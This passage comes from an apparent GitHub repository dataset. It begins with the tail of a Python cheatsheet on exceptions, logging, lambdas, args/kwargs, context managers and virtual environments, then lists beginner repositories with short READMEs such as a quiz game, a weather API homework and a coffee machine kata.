2.')     if height <= 2:       raise Exception('Height must be greater than 2.')     print(symbol * width)     for i in range(height - 2):         print(symbol + (' ' * (width - 2)) + symbol)     print(symbol * width) for sym, w, h in (('*', 4, 4), ('O', 20, 5), ('x', 1, 3), ('ZZ', 3, 3)):     try:         box_print(sym, w, h)     except Exception as err:         print('An exception happened: ' + str(err)) Return to the Top Getting the Traceback as a String The traceback is displayed by Python whenever a raised exception goes unhandled. But can also obtain it as a string by calling traceback.format_exc(). This function is useful if you want the information from an exception’s traceback but also want an except statement to gracefully handle the exception. You will need to import Python’s traceback module before calling this function. >>> import traceback  >>> try: >>>      raise Exception('This is the error message.') >>> except: >>>      with open('errorInfo.txt', 'w') as error_file: >>>          error_file.write(traceback.format_exc()) >>>      print('The traceback info was written to errorInfo.txt.') 116 The traceback info was written to errorInfo.txt. The 116 is the return value from the write() method, since 116 characters were written to the file. The traceback text was written to errorInfo.txt. Traceback (most recent call last):   File ""<pyshell#28>"", line 2, in <module> Exception: This is the error message.  Return to the Top Assertions An assertion is a sanity check to make sure your code isn’t doing something obviously wrong. These sanity checks are performed by assert statements. If the sanity check fails, then an AssertionError exception is raised. In code, an assert statement consists of the following:  The assert keyword A condition (that is, an expression that evaluates to True or False) A comma A string to display when the condition is False  >>> pod_bay_door_status = 'open'  >>> assert pod_bay_door_status == 'open', 'The pod bay doors need to be ""open"".'  >>> pod_bay_door_status = 'I\'m sorry, Dave. I\'m afraid I can\'t do that.'  >>> assert pod_bay_door_status == 'open', 'The pod bay doors need to be ""open"".'  Traceback (most recent call last):   File ""<pyshell#10>"", line 1, in <module>     assert pod_bay_door_status == 'open', 'The pod bay doors need to be ""open"".' AssertionError: The pod bay doors need to be ""open"". In plain English, an assert statement says, “I assert that this condition holds true, and if not, there is a bug somewhere in the program.” Unlike exceptions, your code should not handle assert statements with try and except; if an assert fails, your program should crash. By failing fast like this, you shorten the time between the original cause of the bug and when you first notice the bug. This will reduce the amount of code you will have to check before finding the code that’s causing the bug. Disabling Assertions Assertions can be disabled by passing the -O option when running Python. Return to the Top Logging To enable the logging module to display log messages on your screen as your program runs, copy the following to the top of your program (but under the #! python shebang line): import logging  logging.basicConfig(level=logging.DEBUG, format=' %(asctime)s - %(levelname)s- %(message)s') Say you wrote a function to calculate the factorial of a number. In mathematics, factorial 4 is 1 × 2 × 3 × 4, or 24. Factorial 7 is 1 × 2 × 3 × 4 × 5 × 6 × 7, or 5,040. Open a new file editor window and enter the following code. It has a bug in it, but you will also enter several log messages to help yourself figure out what is going wrong. Save the program as factorialLog.py. >>> import logging >>> >>> logging.basicConfig(level=logging.DEBUG, format=' %(asctime)s - %(levelname)s- %(message)s') >>> >>> logging.debug('Start of program') >>> >>> def factorial(n): >>> >>>     logging.debug('Start of factorial(%s)' % (n)) >>>     total = 1 >>> >>>     for i in range(1, n + 1): >>>         total *= i >>>         logging.debug('i is ' + str(i) + ', total is ' + str(total)) >>> >>>     logging.debug('End of factorial(%s)' % (n)) >>> >>>     return total >>> >>> print(factorial(5)) >>> logging.debug('End of program') 2015-05-23 16:20:12,664 - DEBUG - Start of program 2015-05-23 16:20:12,664 - DEBUG - Start of factorial(5) 2015-05-23 16:20:12,665 - DEBUG - i is 0, total is 0 2015-05-23 16:20:12,668 - DEBUG - i is 1, total is 0 2015-05-23 16:20:12,670 - DEBUG - i is 2, total is 0 2015-05-23 16:20:12,673 - DEBUG - i is 3, total is 0 2015-05-23 16:20:12,675 - DEBUG - i is 4, total is 0 2015-05-23 16:20:12,678 - DEBUG - i is 5, total is 0 2015-05-23 16:20:12,680 - DEBUG - End of factorial(5) 0 2015-05-23 16:20:12,684 - DEBUG - End of program Return to the Top Logging Levels Logging levels provide a way to categorize your log messages by importance. There are five logging levels, described in Table 10-1 from least to most important. Messages can be logged at each level using a different logging function.    Level Logging Function Description     DEBUG logging.debug() The lowest level. Used for small details. Usually you care about these messages only when diagnosing problems.   INFO logging.info() Used to record information on general events in your program or confirm that things are working at their point in the program.   WARNING logging.warning() Used to indicate a potential problem that doesn’t prevent the program from working but might do so in the future.   ERROR logging.error() Used to record an error that caused the program to fail to do something.   CRITICAL logging.critical() The highest level. Used to indicate a fatal error that has caused or is about to cause the program to stop running entirely.    Return to the Top Disabling Logging After you’ve debugged your program, you probably don’t want all these log messages cluttering the screen. The logging.disable() function disables these so that you don’t have to go into your program and remove all the logging calls by hand. >>> import logging  >>> logging.basicConfig(level=logging.INFO, format=' %(asctime)s -%(levelname)s - %(message)s')  >>> logging.critical('Critical error! Critical error!') 2015-05-22 11:10:48,054 - CRITICAL - Critical error! Critical error!  >>> logging.disable(logging.CRITICAL)  >>> logging.critical('Critical error! Critical error!')  >>> logging.error('Error! Error!') Return to the Top Logging to a File Instead of displaying the log messages to the screen, you can write them to a text file. The logging.basicConfig() function takes a filename keyword argument, like so: import logging  logging.basicConfig(filename='myProgramLog.txt', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s') Return to the Top Lambda Functions This function: >>> def add(x, y):         return x + y  >>> add(5, 3) 8 Is equivalent to the lambda function: >>> add = lambda x, y: x + y >>> add(5, 3) 8 It's not even need to bind it to a name like add before: >>> (lambda x, y: x + y)(5, 3) 8 Like regular nested functions, lambdas also work as lexical closures: >>> def make_adder(n):         return lambda x: x + n  >>> plus_3 = make_adder(3) >>> plus_5 = make_adder(5)  >>> plus_3(4) 7 >>> plus_5(4) 9 Note: lambda can only evaluate an expression, like a single line of code. Return to the Top Ternary Conditional Operator Many programming languages have a ternary operator, which define a conditional expression. The most common usage is to make a terse simple conditional assignment statement. In other words, it offers one-line code to evaluate the first expression if the condition is true, otherwise it evaluates the second expression. <expression1> if <condition> else <expression2>  Example: >>> age = 15  >>> print('kid' if age < 18 else 'adult') kid Ternary operators can be chained: >>> age = 15  >>> print('kid' if age < 13 else 'teenager' if age < 18 else 'adult') teenager The code above is equivalent to: if age < 18:     if age < 13:         print('kid')     else:         print('teenager') else:     print('adult') Return to the Top args and kwargs The names args and kwargs are arbitrary - the important thing are the * and ** operators. They can mean:   In a function declaration, * means “pack all remaining positional arguments into a tuple named <name>”, while ** is the same for keyword arguments (except it uses a dictionary, not a tuple).   In a function call, * means “unpack tuple or list named <name> to positional arguments at this position”, while ** is the same for keyword arguments.   For example you can make a function that you can use to call any other function, no matter what parameters it has: def forward(f, *args, **kwargs):     return f(*args, **kwargs) Inside forward, args is a tuple (of all positional arguments except the first one, because we specified it - the f), kwargs is a dict. Then we call f and unpack them so they become normal arguments to f. You use *args when you have an indefinite amount of positional arguments. >>> def fruits(*args): >>>    for fruit in args: >>>       print(fruit)  >>> fruits(""apples"", ""bananas"", ""grapes"")  ""apples"" ""bananas"" ""grapes"" Similarly, you use **kwargs when you have an indefinite number of keyword arguments. >>> def fruit(**kwargs): >>>    for key, value in kwargs.items(): >>>        print(""{0}: {1}"".format(key, value))  >>> fruit(name = ""apple"", color = ""red"")  name: apple color: red >>> def show(arg1, arg2, *args, kwarg1=None, kwarg2=None, **kwargs): >>>   print(arg1) >>>   print(arg2) >>>   print(args) >>>   print(kwarg1) >>>   print(kwarg2) >>>   print(kwargs)  >>> data1 = [1,2,3] >>> data2 = [4,5,6] >>> data3 = {'a':7,'b':8,'c':9}  >>> show(*data1,*data2, kwarg1=""python"",kwarg2=""cheatsheet"",**data3) 1 2 (3, 4, 5, 6) python cheatsheet {'a': 7, 'b': 8, 'c': 9}  >>> show(*data1, *data2, **data3) 1 2 (3, 4, 5, 6) None None {'a': 7, 'b': 8, 'c': 9}  # If you do not specify ** for kwargs >>> show(*data1, *data2, *data3) 1 2 (3, 4, 5, 6, ""a"", ""b"", ""c"") None None {} Things to Remember(args)  Functions can accept a variable number of positional arguments by using *args in the def statement. You can use the items from a sequence as the positional arguments for a function with the * operator. Using the * operator with a generator may cause your program to run out of memory and crash. Adding new positional parameters to functions that accept *args can introduce hard-to-find bugs.  Things to Remember(kwargs)  Function arguments can be specified by position or by keyword. Keywords make it clear what the purpose of each argument is when it would be confusing with only positional arguments. Keyword arguments with default values make it easy to add new behaviors to a function, especially when the function has existing callers. Optional keyword arguments should always be passed by keyword instead of by position.  Return to the Top Context Manager While Python's context managers are widely used, few understand the purpose behind their use. These statements, commonly used with reading and writing files, assist the application in conserving system memory and improve resource management by ensuring specific resources are only in use for certain processes. with statement A context manager is an object that is notified when a context (a block of code) starts and ends. You commonly use one with the with statement. It takes care of the notifying. For example, file objects are context managers. When a context ends, the file object is closed automatically: >>> with open(filename) as f: >>>     file_contents = f.read()  # the open_file object has automatically been closed. Anything that ends execution of the block causes the context manager's exit method to be called. This includes exceptions, and can be useful when an error causes you to prematurely exit from an open file or connection. Exiting a script without properly closing files/connections is a bad idea, that may cause data loss or other problems. By using a context manager you can ensure that precautions are always taken to prevent damage or loss in this way. Writing your own contextmanager using generator syntax It is also possible to write a context manager using generator syntax thanks to the contextlib.contextmanager decorator: >>> import contextlib >>> @contextlib.contextmanager ... def context_manager(num): ...     print('Enter') ...     yield num + 1 ...     print('Exit') >>> with context_manager(2) as cm: ...     # the following instructions are run when the 'yield' point of the context ...     # manager is reached. ...     # 'cm' will have the value that was yielded ...     print('Right in the middle with cm = {}'.format(cm)) Enter Right in the middle with cm = 3 Exit  >>> Return to the Top __main__ Top-level script environment __main__ is the name of the scope in which top-level code executes. A module’s name is set equal to __main__ when read from standard input, a script, or from an interactive prompt. A module can discover whether or not it is running in the main scope by checking its own __name__, which allows a common idiom for conditionally executing code in a module when it is run as a script or with python -m but not when it is imported: >>> if __name__ == ""__main__"": ...     # execute only if run as a script ...     main() For a package, the same effect can be achieved by including a main.py module, the contents of which will be executed when the module is run with -m For example we are developing script which is designed to be used as module, we should do: >>> # Python program to execute function directly >>> def add(a, b): ...     return a+b ... >>> add(10, 20) # we can test it by calling the function save it as calculate.py 30 >>> # Now if we want to use that module by importing we have to comment out our call, >>> # Instead we can write like this in calculate.py >>> if __name__ == ""__main__"": ...     add(3, 5) ... >>> import calculate >>> calculate.add(3, 5) 8 Advantages  Every Python module has it’s __name__ defined and if this is __main__, it implies that the module is being run standalone by the user and we can do corresponding appropriate actions. If you import this script as a module in another script, the name is set to the name of the script/module. Python files can act as either reusable modules, or as standalone programs. if __name__ == “main”: is used to execute some code only if the file was run directly, and not imported.  Return to the Top setup.py The setup script is the centre of all activity in building, distributing, and installing modules using the Distutils. The main purpose of the setup script is to describe your module distribution to the Distutils, so that the various commands that operate on your modules do the right thing. The setup.py file is at the heart of a Python project. It describes all of the metadata about your project. There a quite a few fields you can add to a project to give it a rich set of metadata describing the project. However, there are only three required fields: name, version, and packages. The name field must be unique if you wish to publish your package on the Python Package Index (PyPI). The version field keeps track of different releases of the project. The packages field describes where you’ve put the Python source code within your project. This allows you to easily install Python packages. Often it's enough to write: python setup.py install and module will install itself. Our initial setup.py will also include information about the license and will re-use the README.txt file for the long_description field. This will look like: >>> from distutils.core import setup >>> setup( ...    name='pythonCheatsheet', ...    version='0.1', ...    packages=['pipenv',], ...    license='MIT', ...    long_description=open('README.txt').read(), ... ) Find more information visit http://docs.python.org/install/index.html. Return to the Top Dataclasses Dataclasses are python classes but are suited for storing data objects. This module provides a decorator and functions for automatically adding generated special methods such as __init__() and __repr__() to user-defined classes. Features   They store data and represent a certain data type. Ex: A number. For people familiar with ORMs, a model instance is a data object. It represents a specific kind of entity. It holds attributes that define or represent the entity.   They can be compared to other objects of the same type. Ex: A number can be greater than, less than, or equal to another number.   Python 3.7 provides a decorator dataclass that is used to convert a class into a dataclass. python 2.7 >>> class Number: ...     def __init__(self, val): ...         self.val = val ... >>> obj = Number(2) >>> obj.val 2 with dataclass >>> @dataclass ... class Number: ...     val: int ... >>> obj = Number(2) >>> obj.val 2 Return to the Top Default values It is easy to add default values to the fields of your data class. >>> @dataclass ... class Product: ...     name: str ...     count: int = 0 ...     price: float = 0.0 ... >>> obj = Product(""Python"") >>> obj.name Python >>> obj.count 0 >>> obj.price 0.0 Type hints It is mandatory to define the data type in dataclass. However, If you don't want specify the datatype then, use typing.Any. >>> from dataclasses import dataclass >>> from typing import Any  >>> @dataclass ... class WithoutExplicitTypes: ...    name: Any ...    value: Any = 42 ... Return to the Top Virtual Environment The use of a Virtual Environment is to test python code in encapsulated environments and to also avoid filling the base Python installation with libraries we might use for only one project. Return to the Top virtualenv   Install virtualenv pip install virtualenv    Install virtualenvwrapper-win (Windows) pip install virtualenvwrapper-win    Usage:   Make a Virtual Environment mkvirtualenv HelloWold  Anything we install now will be specific to this project. And available to the projects we connect to this environment.   Set Project Directory To bind our virtualenv with our current working directory we simply enter: setprojectdir .    Deactivate To move onto something else in the command line type ‘deactivate’ to deactivate your environment. deactivate  Notice how the parenthesis disappear.   Workon Open up the command prompt and type ‘workon HelloWold’ to activate the environment and move into your root project folder workon HelloWold    Return to the Top poetry  Poetry is a tool for dependency management and packaging in Python. It allows you to declare the libraries your project depends on and it will manage (install/update) them for you.    Install Poetry pip install --user poetry    Create a new project poetry new my-project  This will create a my-project directory: my-project ├── pyproject.toml ├── README.rst ├── poetry_demo │   └── __init__.py └── tests     ├── __init__.py     └── test_poetry_demo.py  The pyproject.toml file will orchestrate your project and its dependencies: [tool.poetry] name = ""my-project"" version = ""0.1.0"" description = """" authors = [""your name <your@mail.com>""]  [tool.poetry.dependencies] python = ""*""  [tool.poetry.dev-dependencies] pytest = ""^3.4""    Packages To add dependencies to your project, you can specify them in the tool.poetry.dependencies section: [tool.poetry.dependencies] pendulum = ""^1.4""  Also, instead of modifying the pyproject.toml file by hand, you can use the add command and it will automatically find a suitable version constraint. $ poetry add pendulum  To install the dependencies listed in the pyproject.toml: poetry install  To remove dependencies: poetry remove pendulum    For more information, check the documentation. Return to the Top pipenv  Pipenv is a tool that aims to bring the best of all packaging worlds (bundler, composer, npm, cargo, yarn, etc.) to the Python world. Windows is a first-class citizen, in our world.    Install pipenv pip install pipenv    Enter your Project directory and install the Packages for your project cd my_project pipenv install <package>  Pipenv will install your package and create a Pipfile for you in your project’s directory. The Pipfile is used to track which dependencies your project needs in case you need to re-install them.   Uninstall Packages pipenv uninstall <package>    Activate the Virtual Environment associated with your Python project pipenv shell    Exit the Virtual Environment exit    Find more information and a video in docs.pipenv.org. Return to the Top anaconda Anaconda is another popular tool to manage python packages.  Where packages, notebooks, projects and environments are shared. Your place for free public conda package hosting.  Usage:   Make a Virtual Environment conda create -n HelloWorld    To use the Virtual Environment, activate it by: conda activate HelloWorld  Anything installed now will be specific to the project HelloWorld   Exit the Virtual Environment conda deactivate    Return to the Top "
417860959;args-kwargs-python;https://github.com/ASJADSYED08/args-kwargs-python;Python;2021-10-16T15:00:10Z;0;0;0;
417840885;python-quiz-game;https://github.com/andrekohandi/python-quiz-game;Python;2021-10-16T13:46:45Z;0;0;0;python-quiz-game This is code from 100 Days of Code Python by Angela Yu, where we made a quiz (trivia) game, implementing OOP on Python 
417829041;Financial-Analysis-using-Python;https://github.com/ferozshsh/Financial-Analysis-using-Python;;2021-10-16T12:59:08Z;0;0;0;
417764770;python-public-API;https://github.com/LevProg/python-public-API;Python;2021-10-16T08:20:38Z;1;1;0;python-public-API This repository is a public API for solving the problem of the final of the AIIJC competition. The task is to create an AI for the classification of traffic signs, the 'model' file is a ready trained model and the prediction is done in 'PublicAPI.py'. The API itself is written in Python using the Flask framework The API should receive an image of a road turn sign as input (it can consist of several signs) and send the name of the signs from left to right.  We will use our own computer as a server and ngrok as a proxy. ngrok - https://ngrok.com/download With 'PublicAPI.py' we start a local server  Next, open ngrok.exe and run the proxy with the command: 'ngrok http your_port', in our case our port is 4567, in response we will receive the URL  We will check the functionality of the API using the 'TestPublicAPI.py' file, we send a request with a photo to the URL received from ngrok.  Also we can just go to the received URL and send the file manually  
417851476;Usual-RPG-game-Python;https://github.com/Glide220/Usual-RPG-game-Python;;2021-10-16T14:25:24Z;0;0;0;
417776433;Python_breakout_game;https://github.com/Prajaktaj38/Python_breakout_game;;2021-10-16T09:14:29Z;0;0;0;Python_breakout_game A breakout game uaing Python technology. Breakout is a video game where the object is to bounce a punk across the screen breakin all the bricks in each level. 
417801414;Magic_Square-in-Python;https://github.com/abhishek173/Magic_Square-in-Python;Python;2021-10-16T11:02:08Z;0;0;0;
417859370;tarea-1-python;https://github.com/GZe00/tarea-1-python;Python;2021-10-16T14:54:12Z;0;0;0;
417808879;SpeechRecognitionWithPython;https://github.com/neyrajy/SpeechRecognitionWithPython;Python;2021-10-16T11:34:36Z;0;0;0;
417831346;python_lesson5;https://github.com/Emeleinbaki/python_lesson5;;2021-10-16T13:08:12Z;0;0;0;
417848529;Numerical-Python-Book;https://github.com/mvpetri/Numerical-Python-Book;Jupyter Notebook;2021-10-16T14:15:54Z;0;0;0;Numerical-Python-Book Personal files created while learning with the book Numerical Python 
417837179;python-drycc-sample;https://github.com/fly8love/python-drycc-sample;Shell;2021-10-16T13:31:25Z;0;0;0;"Drycc Pack Base Images  This repository is responsible for building and publishing images that builds with Cloud Native Buildpacks' pack command.  drycc/pack:20 - A CNB compatible run image based on drycc/pack:20 drycc/pack:20-build - A CNB compatible build image based on drycc/pack:20-build  Usage pack build myapp --builder drycc/buildpacks:20 System The basic image is based on Debian system, See the table below for system description：    STACK ID Buildpacks image Operating System     drycc-20 docker.io/drycc/buildpacks:20 Debian 11 Bullseye    The basic layer of buildpack supports custom software sources and custom software. For example, if we use alicloud to install libpq-dev, we can add .deb-list and ·source-list files to the project. cat > "".source-list"" <<EOL deb http://mirrors.cloud.aliyuncs.com/debian/ bullseye main non-free contrib deb-src http://mirrors.cloud.aliyuncs.com/debian/ bullseye main non-free contrib deb http://mirrors.cloud.aliyuncs.com/debian-security bullseye/updates main deb-src http://mirrors.cloud.aliyuncs.com/debian-security bullseye/updates main deb http://mirrors.cloud.aliyuncs.com/debian/ bullseye-updates main non-free contrib deb-src http://mirrors.cloud.aliyuncs.com/debian/ bullseye-updates main non-free contrib deb http://mirrors.cloud.aliyuncs.com/debian/ bullseye-backports main non-free contrib deb-src http://mirrors.cloud.aliyuncs.com/debian/ bullseye-backports main non-free contrib EOL  cat > "".deb-list"" <<EOL libpq-dev EOL  Reference Pack Images bundles the following technologies together into a single cohesive distribution:  Stack Images Pack Runtimes Pack CLI Buildpacks lifecycle  "
417832670;Emails-using-python;https://github.com/Pavithran17/Emails-using-python;Python;2021-10-16T13:13:23Z;0;0;0;Emails-using-python Requirements   As the python script will access the Gmail account to send emails, we need to turn to Allow less secure apps to ON in this account. This will make it easier for our python program to access your account. Therefore, it is recommended to create a temporary account for this purpose.   Next, to send emails with Python, we need to create a text file named template.txt. This text file contains the format of the body of the email: Dear ${PERSON_NAME} You have secured the following marks in your mid-term exams: Math - ${MATH} English - ${ENG} Science - ${SCI}    3)Then the next file you should have is a CSV file. The file I’ll be using has the details that need to fill in the placeholders in the template file. It contains the details that should be sent to the recipients. It can be an Excel file or a CSV file. 4)Finally, don’t forget to close the SMTP connection after sending all messages. 
417844667;python-api-challenge;https://github.com/Waltontan/python-api-challenge;Jupyter Notebook;2021-10-16T14:01:57Z;0;0;0;"Python API Homework - What's the Weather Like? Background Whether financial, political, or social -- data's true power lies in its ability to answer questions definitively. So let's take what you've learned about Python requests, APIs, and JSON traversals to answer a fundamental question: ""What's the weather like as we approach the equator?"" Now, we know what you may be thinking: ""Duh. It gets hotter..."" But, if pressed, how would you prove it?  Before You Begin   Create a new repository for this project called python-api-challenge. Do not add this homework to an existing repository.   Clone the new repository to your computer.   Inside your local git repository, create a directory for both of the  Python Challenges. Use folder names corresponding to the challenges: WeatherPy.   Inside the folder that you just created, add new files called WeatherPy.ipynb and VacationPy.ipynb. These will be the main scripts to run for each analysis.   Push the above changes to GitHub.   Part I - WeatherPy In this example, you'll be creating a Python script to visualise the weather of 500+ cities across the world of varying distance from the equator. To accomplish this, you'll be utilising a simple Python library, the OpenWeatherMap API, and a little common sense to create a representative model of weather across world cities. Your first requirement is to create a series of scatter plots to showcase the following relationships:  Temperature (F) vs. Latitude Humidity (%) vs. Latitude Cloudiness (%) vs. Latitude Wind Speed (mph) vs. Latitude  After each plot add a sentence or too explaining what the code is and analysing. Your second requirement is to run linear regression on each relationship, only this time separating them into Northern Hemisphere (greater than or equal to 0 degrees latitude) and Southern Hemisphere (less than 0 degrees latitude):  Northern Hemisphere - Temperature (F) vs. Latitude Southern Hemisphere - Temperature (F) vs. Latitude Northern Hemisphere - Humidity (%) vs. Latitude Southern Hemisphere - Humidity (%) vs. Latitude Northern Hemisphere - Cloudiness (%) vs. Latitude Southern Hemisphere - Cloudiness (%) vs. Latitude Northern Hemisphere - Wind Speed (mph) vs. Latitude Southern Hemisphere - Wind Speed (mph) vs. Latitude  After each pair of plots explain what the linear regression is modelling such as any relationships you notice and any other analysis you may have. Your final notebook must:  Randomly select at least 500 unique (non-repeat) cities based on latitude and longitude. Perform a weather check on each of the cities using a series of successive API calls. Include a print log of each city as it's being processed with the city number and city name. Save a CSV of all retrieved data and a PNG image for each scatter plot.  Part II - VacationPy Now let's use your skills in working with weather data to plan future vacations. Use jupyter-gmaps and the Google Places API for this part of the assignment.   Note: Remember that any API usage beyond the $200 credit will be charged to your personal account. You can set quotas and limits to your daily requests to be sure you can't be charged. Check out Google Maps Platform Billing and Manage your cost of use for more information.   Note: if you having trouble displaying the maps try running jupyter nbextension enable --py gmaps in your environment and retry.   Create a heat map that displays the humidity for every city from the part I of the homework.    Narrow down the DataFrame to find your ideal weather condition. For example:   A max temperature lower than 80 degrees but higher than 70.   Wind speed less than 10 mph.   Zero cloudiness.   Drop any rows that don't contain all three conditions. You want to be sure the weather is ideal.   Note: Feel free to adjust to your specifications but be sure to limit the number of rows returned by your API requests to a reasonable number.     Using Google Places API to find the first hotel for each city located within 5000 meters of your coordinates.   Plot the hotels on top of the humidity heatmap with each pin containing the Hotel Name, City, and Country.    As final considerations:  Create a new GitHub repository for this project called API-Challenge (note the kebab-case). Do not add to an existing repo You must complete your analysis using a Jupyter notebook. You must use the Matplotlib or Pandas plotting libraries. For Part I, you must include a written description of three observable trends based on the data. For Part II, you must include a screenshot of the heatmap you create and include it in your submission. You must use proper labelling of your plots, including aspects like: Plot Titles (with date of analysis) and Axes Labels. For max intensity in the heat map, try setting it to the highest humidity found in the data set.  Hints and Considerations   The city data you generate is based on random coordinates as well as different query times; as such, your outputs will not be an exact match to the provided starter notebook.   You may want to start this assignment by refreshing yourself on the geographic coordinate system.   Next, spend the requisite time necessary to study the OpenWeatherMap API. Based on your initial study, you should be able to answer  basic questions about the API: Where do you request the API key? Which Weather API in particular will you need? What URL endpoints does it expect? What JSON structure does it respond with? Before you write a line of code, you should be aiming to have a crystal clear understanding of your intended outcome.   A starter code for Citipy has been provided. However, if you're craving an extra challenge, push yourself to learn how it works: citipy Python library. Before you try to incorporate the library into your analysis, start by creating simple test cases outside your main script to confirm that you are using it correctly. Too often, when introduced to a new library, students get bogged down by the most minor of errors -- spending hours investigating their entire code -- when, in fact, a simple and focused test would have shown their basic utilisation of the library was wrong from the start. Don't let this be you!   Part of our expectation in this challenge is that you will use critical thinking skills to understand how and why we're recommending the tools we are. What is Citipy for? Why would you use it in conjunction with the OpenWeatherMap API? How would you do so?   In building your script, pay attention to the cities you are using in your query pool. Are you getting coverage of the full gamut of latitudes and longitudes? Or are you simply choosing 500 cities concentrated in one region of the world? Even if you were a geographic genius, simply rattling 500 cities based on your human selection would create a biased dataset. Be thinking of how you should counter this. (Hint: Consider the full range of latitudes).   Once you have computed the linear regression for one chart, the process will be similar for all others. As a bonus, try to create a function that will create these charts based on different parameters.   Remember that each coordinate will trigger a separate call to the Google API. If you're creating your own criteria to plan your vacation, try to reduce the results in your DataFrame to 10 or fewer cities.   Lastly, remember -- this is a challenging activity. Push yourself! If you complete this task, then you can safely say that you've gained a strong mastery of the core foundations of data analytics and it will only go better from here. Good luck!   Copyright © 2021 Trilogy Education Services, LLC, a 2U, Inc. brand. Confidential and Proprietary. All Rights Reserved. "
417815796;Python-Handling-Files;https://github.com/Danielkhakbaz/Python-Handling-Files;Python;2021-10-16T12:04:21Z;0;0;0;Python-Handling-Files 
417796907;python-REST-templafy;https://github.com/benjamin-jin/python-REST-templafy;Python;2021-10-16T10:43:13Z;0;0;0;python-REST-templafy 
417805780;python-cod3r;https://github.com/EltonOliveira1/python-cod3r;;2021-10-16T11:21:24Z;0;0;0;python-cod3r Curso de python da Cod3r 
417792574;emc_python_api;https://github.com/cofob/emc_python_api;Python;2021-10-16T10:22:22Z;0;0;0;emc_python_api Emercoin python 3 API 
417841070;Atividades-logica-Python;https://github.com/lfernand0/Atividades-logica-Python;Python;2021-10-16T13:47:34Z;0;0;0;Atividades-logica-Python Resolução de atividades de lógica com Python  Dado o tamanho da base e da altura de um retângulo, calcular a sua área e o seu perímetro. Dado o tamanho do lado de um quadrado, calcular a área e o perímetro do mesmo. Dado o tamanho do raio de uma circunferência, calcular a área e o perímetro da mesma. Dado os três lados de um triângulo determinar o perímetro do mesmo. Ler um número inteiro e exibir o seu sucessor. Ler dois números inteiros e exibir o quociente e o resto da divisão inteira entre eles. Dado que a fórmula para conversão de Fahrenheit para Celsius é C = 5/9 (F – 32), leu um valor de temperatura em Fahrenheit e exibi-lo em Celsius Faça um algoritmo para calcular a nota semestral de um aluno. A nota semestral é obtida pela média aritmética entre a nota de 2 bimestres. Cada nota de bimestre é composta por 2 notas de provas. Faça um algoritmo que transforme uma velocidade fornecida em m/s pelo usuário para Km/h. Para tal, multiplique o valor em m/s por 3,6.  
417844597;exercises-python-control_structures;https://github.com/jimjang/exercises-python-control_structures;;2021-10-16T14:01:45Z;0;0;0;
417849796;python_fundamental_factor;https://github.com/aizwellenstan/python_fundamental_factor;Python;2021-10-16T14:19:49Z;0;0;0;
417776781;python-spammer2;https://github.com/pendragons-code/python-spammer2;Python;2021-10-16T09:16:01Z;0;0;0;python-spammer2 i modified a spammer becuz why not. I also adjusted and fixed a few bugs 
417771359;python-car-game;https://github.com/AYUSHI-30/python-car-game;;2021-10-16T08:52:29Z;0;0;0;python-car-game 
417785454;100-Days-Of-Python;https://github.com/shalinimurali20/100-Days-Of-Python;Python;2021-10-16T09:52:59Z;0;0;0;100-Days-Of-Python Documenting my 100 Days of Python journey beginning from scratch alongside building projects 😍 Goals:  Solve atleast 1 HackerRank Problem a day 🧠 Start with small projects and collaborate in making bigger ones 💡 Contribute to open source 🤝 To write beginner friendly blogs and guide people in taking up Python 📖  Contents:  Follow me at Hashnode to make your brain bigger     Day Project Description Language Status     1 Band Name Generator Generate a band name by getting input from the user and concatenating it Python Done ✔    References:  100 Days of Code - The Complete Python Pro Bootcamp - Udemy W3Schools  
417806450;project_python_Assignment_2;https://github.com/schahinheidari/project_python_Assignment_2;Python;2021-10-16T11:24:15Z;0;0;0;
417809864;Python-as-Calculator;https://github.com/LokeshwarPrasad3/Python-as-Calculator;;2021-10-16T11:39:22Z;1;1;0;
417819529;Python-For-Hacking;https://github.com/m45t3r95/Python-For-Hacking;Python;2021-10-16T12:19:39Z;0;0;0;
417859809;python-dev-layer;https://github.com/stephenbawks/python-dev-layer;;2021-10-16T14:55:46Z;0;0;0;python-dev-layer 
417825903;coffee_machine_python;https://github.com/luisrovirosa/coffee_machine_python;Python;2021-10-16T12:46:15Z;0;0;0;"Project In this Coffee Machine Project, your task is to implement the logic (starting from a simple class) that translates orders from customers of the coffee machine to the drink maker. Your code will use the drink maker protocol to send commands to the drink maker. First iteration - Making drinks In this iteration, your task is to implement the logic (starting from a simple class) that translates orders from customers of the coffee machine to the drink maker. Your code will use the drink maker protocol (see below) to send commands to the drink maker. The coffee machine can serves 3 type of drinks: tea, coffee, chocolate. Use cases Your product owner has delivered the stories and here they are:  The drink maker should receive the correct instructions for my coffee / tea / chocolate order I want to be able to send instructions to the drink maker to add one or two sugars When my order contains sugar the drink maker should add a stick (touillette) with it  Drink maker protocol The drink maker receives string commands from your code to make the drinks. It can also deliver info messages to the customer if ordered so. The instructions it receives follow this format: ""T:1:0"" (Drink maker makes 1 tea with 1 sugar and a stick) ""H::"" (Drink maker makes 1 chocolate with no sugar and therefore no stick) ""C:2:0"" (Drink maker makes 1 coffee with 2 sugars and a stick) ""M:message-content"" (Drink maker forwards any message received onto the coffee machine interface for the customer to see)  Second iteration - Going into business The coffee machine is not free anymore! One tea is 0,4 euro, a coffee is 0,6 euro, a chocolate is 0,5 euro. The drink maker will now only make a drink if enough money is given for it Use cases  The drink maker should make the drinks only if the correct amount of money is given If not enough money is provided, we want to send a message to the drink maker. The message should contains at least the amount of money missing.  Important Remember that the drink maker forwards any message received onto the coffee machine interface for the customer to see. If too much money is given, the drink maker will still make the drink according to the instructions. The machine will handle the return of the correct change. So do not worry about that. You don't need to worry if there is too much money inserted. Just make sure, the minimum amount of money is set. Third iteration - Extra hot The machine has been upgraded and the drink maker is now able to make orange juice and to deliver extra hot drinks. You have to update your code to send the correct messages to the drink maker so that users can have orange juices or extra hot drinks Let us see if your implementation is flexible enough to welcome those changes with not too much hassle. Use cases  I want to be able to buy a orange juice for 0,6 euro I want to be able to have my coffee, chocolate or tea extra hot  Implementation details Here are the new protocol commands added to the new firmware of the drink maker: ""O::"" (Drink maker will make one orange juice) ""Ch::"" (Drink maker will make an extra hot coffee with no sugar) ""Hh:1:0"" (Drink maker will make an extra hot chocolate with one sugar and a stick) ""Th:2:0"" (The drink maker will make an extra hot tea with two sugar and a stick)  Fourth iteration - Making money The machine is becoming popular in the office. The management is eager to have daily reports of what is sold and when. Use cases  I want to be able to print a report anytime that contains: how many of each drink was sold and the total amount of money earned so far.  ##Implementation details For the reporting, you can have a repository of data with a simple data structure in memory. A simple reporting can be done by printing to the console. Of course all of that should be tested before it is written, but you know that already, don't you ? ;) Fifth iteration - Running out The users of 